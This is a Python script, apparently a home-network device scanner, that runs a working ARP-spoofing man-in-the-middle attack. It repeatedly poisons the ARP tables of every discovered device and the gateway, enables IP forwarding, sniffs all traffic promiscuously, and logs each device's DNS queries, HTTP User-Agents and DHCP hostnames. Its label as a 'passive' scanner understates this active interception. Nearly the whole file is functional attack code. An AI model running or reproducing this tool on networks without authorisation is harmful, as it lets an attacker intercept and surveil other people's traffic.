#!/usr/bin/env python3
"""
MITM Passive Network Scanner
Intercepts all traffic between router and devices to detect EVERY device on the network.

This scanner:
1. Uses ARP spoofing to position as man-in-the-middle
2. Captures ALL packets flowing through the network
3. Extracts device information from actual traffic
4. Detects even silent/sleeping devices when they communicate
5. Provides deep packet inspection for device fingerprinting

Requires: Administrator/root privileges
"""

import sys
import time
import json
import threading
from collections import defaultdict
from datetime import datetime

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.dhcp import DHCP, BOOTP
    from scapy.layers.dns import DNS, DNSQR
except ImportError:
    print("ERROR: Scapy not installed. Run: pip install scapy")
    sys.exit(1)

import socket
import struct
import re


class MITMNetworkScanner:
    """Man-in-the-Middle Network Scanner - Detects ALL devices via traffic interception"""
    
    def __init__(self, router_ip="192.168.1.1", interface=None):
        self.router_ip = router_ip
        self.interface = interface or conf.iface
        self.gateway_mac = None
        self.my_mac = None
        self.my_ip = None
        
        # Device tracking
        self.devices = {}  # mac -> device_info
        self.device_lock = threading.Lock()
        
        # Traffic statistics
        self.traffic_stats = defaultdict(lambda: {'bytes_sent': 0, 'bytes_recv': 0, 'packets': 0, 'protocols': set()})
        
        # Running state
        self.running = False
        self.sniffer_thread = None
        self.arp_thread = None
        
        # Get network info
        self._init_network_info()
    
    def _init_network_info(self):
        """Initialize network interface information"""
        try:
            # Get my IP and MAC
            self.my_ip = get_if_addr(self.interface)
            self.my_mac = get_if_hwaddr(self.interface)
            
            # Get gateway MAC via ARP
            print(f"[*] Resolving gateway {self.router_ip}...")
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.router_ip)
            result = srp(arp_request, timeout=2, verbose=False)[0]
            
            if result:
                self.gateway_mac = result[0][1].hwsrc
                print(f"[✓] Gateway MAC: {self.gateway_mac}")
            else:
                print(f"[!] Could not resolve gateway MAC")
                self.gateway_mac = "ff:ff:ff:ff:ff:ff"
                
        except Exception as e:
            print(f"[!] Network init error: {e}")
            self.my_ip = "0.0.0.0"
            self.my_mac = "00:00:00:00:00:00"
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding to act as gateway"""
        try:
            if sys.platform == "win32":
                # Windows: Enable IP routing
                os.system("netsh interface ipv4 set interface \"{}\" forwarding=enabled".format(self.interface))
                print("[✓] IP forwarding enabled (Windows)")
            else:
                # Linux/Mac
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                print("[✓] IP forwarding enabled (Linux)")
        except Exception as e:
            print(f"[!] Could not enable IP forwarding: {e}")
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding (restore normal state)"""
        try:
            if sys.platform == "win32":
                os.system("netsh interface ipv4 set interface \"{}\" forwarding=disabled".format(self.interface))
            else:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[✓] IP forwarding disabled")
        except Exception as e:
            print(f"[!] Could not disable IP forwarding: {e}")
    
    def arp_spoof(self, target_ip, target_mac):
        """Send ARP spoof packet to redirect traffic through us"""
        # Tell target that we are the gateway
        spoof_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                          psrc=self.router_ip, hwsrc=self.my_mac)
        
        # Tell gateway that we are the target
        spoof_gateway = ARP(op=2, pdst=self.router_ip, hwdst=self.gateway_mac,
                           psrc=target_ip, hwsrc=self.my_mac)
        
        send(spoof_target, verbose=False)
        send(spoof_gateway, verbose=False)
    
    def restore_arp(self, target_ip, target_mac):
        """Restore original ARP tables"""
        restore_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                            psrc=self.router_ip, hwsrc=self.gateway_mac)
        
        restore_gateway = ARP(op=2, pdst=self.router_ip, hwdst=self.gateway_mac,
                             psrc=target_ip, hwsrc=target_mac)
        
        send(restore_target, count=3, verbose=False)
        send(restore_gateway, count=3, verbose=False)
    
    def arp_poison_loop(self):
        """Continuously poison ARP tables to maintain MITM position"""
        print("[*] Starting ARP spoofing loop...")
        
        while self.running:
            try:
                with self.device_lock:
                    for mac, device in self.devices.items():
                        if mac != self.my_mac and mac != self.gateway_mac:
                            ip = device.get('ip')
                            if ip and ip != self.router_ip:
                                self.arp_spoof(ip, mac)
                
                time.sleep(2)  # Spoof every 2 seconds
                
            except Exception as e:
                print(f"[!] ARP poison error: {e}")
                time.sleep(1)
    
    def extract_hostname_from_dhcp(self, packet):
        """Extract hostname from DHCP packets"""
        if DHCP in packet:
            for option in packet[DHCP].options:
                if isinstance(option, tuple) and option[0] == 'hostname':
                    return option[1].decode('utf-8', errors='ignore')
        return None
    
    def extract_hostname_from_dns(self, packet):
        """Extract device info from DNS queries"""
        if DNS in packet and packet.haslayer(DNSQR):
            query = packet[DNSQR].qname.decode('utf-8', errors='ignore')
            return query
        return None
    
    def detect_protocol(self, packet):
        """Detect the protocol/traffic type from packet"""
        try:
            if TCP in packet:
                dport = packet[TCP].dport
                sport = packet[TCP].sport
                
                # Common protocols by port
                if dport == 80 or sport == 80:
                    return 'HTTP'
                elif dport == 443 or sport == 443:
                    return 'HTTPS'
                elif dport == 22 or sport == 22:
                    return 'SSH'
                elif dport == 21 or sport == 21:
                    return 'FTP'
                elif dport == 25 or sport == 25:
                    return 'SMTP'
                elif dport == 110 or sport == 110:
                    return 'POP3'
                elif dport == 143 or sport == 143:
                    return 'IMAP'
                elif dport == 3389 or sport == 3389:
                    return 'RDP'
                elif dport == 5900 or sport == 5900:
                    return 'VNC'
                else:
                    return 'TCP'
            
            elif UDP in packet:
                dport = packet[UDP].dport
                sport = packet[UDP].sport
                
                if dport == 53 or sport == 53:
                    return 'DNS'
                elif dport == 67 or sport == 67 or dport == 68 or sport == 68:
                    return 'DHCP'
                elif dport == 123 or sport == 123:
                    return 'NTP'
                elif dport == 5353 or sport == 5353:
                    return 'mDNS'
                elif dport == 1900 or sport == 1900:
                    return 'SSDP'
                else:
                    return 'UDP'
            
            elif ICMP in packet:
                return 'ICMP'
            
            elif ARP in packet:
                return 'ARP'
            
            return 'Unknown'
        except:
            return 'Unknown'
    
    def fingerprint_device_from_traffic(self, packet, device_info):
        """Advanced device fingerprinting from packet analysis"""
        
        # HTTP User-Agent detection
        if TCP in packet and packet[TCP].dport == 80:
            payload = bytes(packet[TCP].payload)
            if b'User-Agent:' in payload:
                try:
                    ua = payload.split(b'User-Agent:')[1].split(b'\r\n')[0].decode('utf-8', errors='ignore').strip()
                    device_info['user_agent'] = ua
                    
                    # Detect OS from User-Agent
                    if 'iPhone' in ua or 'iOS' in ua:
                        device_info['os'] = 'iOS'
                        device_info['type'] = 'iPhone/iPad'
                    elif 'Android' in ua:
                        device_info['os'] = 'Android'
                        device_info['type'] = 'Android Phone/Tablet'
                    elif 'Windows NT' in ua:
                        device_info['os'] = 'Windows'
                        device_info['type'] = 'Windows PC'
                    elif 'Macintosh' in ua:
                        device_info['os'] = 'macOS'
                        device_info['type'] = 'Mac'
                    elif 'Linux' in ua:
                        device_info['os'] = 'Linux'
                except:
                    pass
        
        # DHCP fingerprinting
        hostname = self.extract_hostname_from_dhcp(packet)
        if hostname:
            device_info['hostname'] = hostname
        
        # DNS query fingerprinting
        dns_query = self.extract_hostname_from_dns(packet)
        if dns_query:
            if 'dns_queries' not in device_info:
                device_info['dns_queries'] = []
            device_info['dns_queries'].append(dns_query)
        
        # Port usage fingerprinting
        if TCP in packet:
            port = packet[TCP].dport
            if 'ports' not in device_info:
                device_info['ports'] = set()
            device_info['ports'].add(port)
            
            # Known port signatures
            if port == 5353:  # mDNS
                device_info['type'] = 'Apple Device'
            elif port == 62078:  # iPhone sync
                device_info['type'] = 'iPhone'
                device_info['os'] = 'iOS'
    
    def packet_handler(self, packet):
        """Process each intercepted packet - captures ALL traffic types"""
        try:
            if not packet.haslayer(Ether):
                return
            
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            
            # Skip our own packets and broadcasts
            if src_mac == self.my_mac or src_mac == "ff:ff:ff:ff:ff:ff":
                return
            
            # Process source device
            with self.device_lock:
                if src_mac not in self.devices:
                    self.devices[src_mac] = {
                        'mac': src_mac,
                        'first_seen': datetime.now().isoformat(),
                        'last_seen': datetime.now().isoformat(),
                        'ip': None,
                        'hostname': 'Unknown',
                        'manufacturer': self.get_manufacturer(src_mac),
                        'type': 'Unknown Device',
                        'os': 'Unknown'
                    }
                
                device = self.devices[src_mac]
                device['last_seen'] = datetime.now().isoformat()
                
                # Always update traffic stats (even for non-IP packets)
                self.traffic_stats[src_mac]['bytes_sent'] += len(packet)
                self.traffic_stats[src_mac]['packets'] += 1
                
                # Extract IP address and detect protocols
                if IP in packet:
                    device['ip'] = packet[IP].src
                    
                    # Detect protocol type
                    protocol = self.detect_protocol(packet)
                    if protocol:
                        self.traffic_stats[src_mac]['protocols'].add(protocol)
                
                # Detect ARP packets (non-IP traffic)
                elif ARP in packet:
                    if packet[ARP].psrc and packet[ARP].psrc != '0.0.0.0':
                        device['ip'] = packet[ARP].psrc
                    self.traffic_stats[src_mac]['protocols'].add('ARP')
                
                # Detect other layer 2/3 protocols
                else:
                    # Capture any other Ethernet traffic
                    self.traffic_stats[src_mac]['protocols'].add('Other')
                
                # Fingerprint device from packet contents
                self.fingerprint_device_from_traffic(packet, device)
                
        except Exception as e:
            # Silently ignore packet processing errors
            pass
    
    def get_manufacturer(self, mac):
        """Get manufacturer from MAC address OUI"""
        # Enhanced MAC vendor database
        mac_db = {
            'A4:91:B1': 'Huawei',
            '00:E0:4C': 'Realtek',
            '00:50:56': 'VMware',
            '08:00:27': 'VirtualBox',
            '00:1C:42': 'Apple',
            '00:25:00': 'Apple',
            'AC:DE:48': 'Apple',
            '28:6A:BA': 'Apple',
            '3C:E0:72': 'Samsung',
            '00:12:FB': 'Samsung',
            '70:F9:27': 'Intel',
            '00:1E:65': 'Intel',
            'E8:94:F6': 'TP-Link',
            '50:C7:BF': 'TP-Link',
            '00:0C:29': 'VMware',
        }
        
        oui = mac[:8].upper()
        return mac_db.get(oui, 'Unknown Manufacturer')
    
    def start_passive_scan(self, duration=30):
        """Start passive MITM scanning for specified duration - 100% traffic capture"""
        print(f"\n{'='*60}")
        print(f"🔍 MITM Passive Network Scanner - 100% Traffic Capture")
        print(f"{'='*60}")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Gateway: {self.router_ip} ({self.gateway_mac})")
        print(f"[*] My IP: {self.my_ip} ({self.my_mac})")
        print(f"[*] Duration: {duration} seconds")
        print(f"[*] Capture Mode: ALL TRAFFIC (no filter, promiscuous mode)")
        print(f"{'='*60}\n")
        
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        # Start ARP poisoning in background
        self.running = True
        self.arp_thread = threading.Thread(target=self.arp_poison_loop, daemon=True)
        self.arp_thread.start()
        
        # Start packet sniffing
        print("[*] Intercepting network traffic...")
        print("[*] Detecting devices from actual packets...\n")
        
        try:
            # Configure scapy for maximum performance
            conf.sniff_promisc = True  # Enable promiscuous mode globally
            
            # Sniff packets for the duration - NO FILTER to capture 100% of traffic
            # This captures ALL packets: IP, ARP, IPv6, ICMP, UDP, TCP, everything
            print("[*] Starting 100% traffic capture...")
            print("[*] Capturing: IP, TCP, UDP, ARP, ICMP, DNS, DHCP, and ALL other protocols")
            print("[*] Buffer size: Unlimited (store=False for memory efficiency)")
            print("")
            
            sniff(prn=self.packet_handler, 
                  filter=None,  # NO FILTER = Capture ALL traffic (100%)
                  iface=self.interface, 
                  timeout=duration,
                  store=False,  # Don't store packets in memory (process on-the-fly)
                  promisc=True,  # Promiscuous mode captures all network traffic
                  count=0)  # No packet count limit
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
        except Exception as e:
            print(f"\n[!] Sniffing error: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Stop MITM scanning and restore network"""
        print("\n[*] Stopping MITM scanner...")
        self.running = False
        
        # Restore ARP tables
        print("[*] Restoring ARP tables...")
        with self.device_lock:
            for mac, device in self.devices.items():
                if mac != self.my_mac and mac != self.gateway_mac:
                    ip = device.get('ip')
                    if ip:
                        self.restore_arp(ip, mac)
        
        # Disable IP forwarding
        self.disable_ip_forwarding()
        
        print("[✓] Network restored to normal state")
    
    def get_devices(self):
        """Get all detected devices"""
        with self.device_lock:
            # Convert sets to lists for JSON serialization
            devices_copy = {}
            for mac, device in self.devices.items():
                dev = device.copy()
                if 'ports' in dev:
                    dev['ports'] = list(dev['ports'])
                if 'dns_queries' in dev:
                    dev['dns_queries'] = dev['dns_queries'][:5]  # Limit to 5
                
                # Add traffic stats
                stats = dict(self.traffic_stats[mac])
                if 'protocols' in stats:
                    stats['protocols'] = list(stats['protocols'])
                dev['traffic'] = stats
                
                devices_copy[mac] = dev
            
            return devices_copy
    
    def print_results(self):
        """Print all detected devices"""
        devices = self.get_devices()
        
        print(f"\n{'='*80}")
        print(f"📊 MITM Scan Results - {len(devices)} devices detected")
        print(f"{'='*80}\n")
        
        for idx, (mac, device) in enumerate(devices.items(), 1):
            print(f"[{idx}] {device.get('hostname', 'Unknown')}")
            print(f"    MAC: {mac}")
            print(f"    IP: {device.get('ip', 'Unknown')}")
            print(f"    Manufacturer: {device.get('manufacturer', 'Unknown')}")
            print(f"    Type: {device.get('type', 'Unknown')}")
            print(f"    OS: {device.get('os', 'Unknown')}")
            print(f"    Traffic: ↑{device['traffic']['bytes_sent']} bytes, "
                  f"↓{device['traffic']['bytes_recv']} bytes "
                  f"({device['traffic']['packets']} packets)")
            print(f"    First Seen: {device.get('first_seen', 'Unknown')}")
            print(f"    Last Seen: {device.get('last_seen', 'Unknown')}")
            
            if 'user_agent' in device:
                print(f"    User-Agent: {device['user_agent'][:60]}...")
            
            print()
        
        print(f"{'='*80}\n")


def main():
    """Main function for standalone testing"""
    if len(sys.argv) > 1:
        router_ip = sys.argv[1]
    else:
        router_ip = "192.168.1.1"
    
    print("⚠️  WARNING: This scanner requires Administrator/root privileges!")
    print("⚠️  It will intercept ALL network traffic (ARP spoofing)")
    print()
    
    try:
        scanner = MITMNetworkScanner(router_ip=router_ip)
        scanner.start_passive_scan(duration=30)  # Scan for 30 seconds
        scanner.print_results()
        
        # Save results to JSON
        devices = scanner.get_devices()
        output_file = 'mitm_devices.json'
        with open(output_file, 'w') as f:
            json.dump(devices, f, indent=2)
        
        print(f"[✓] Results saved to {output_file}")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
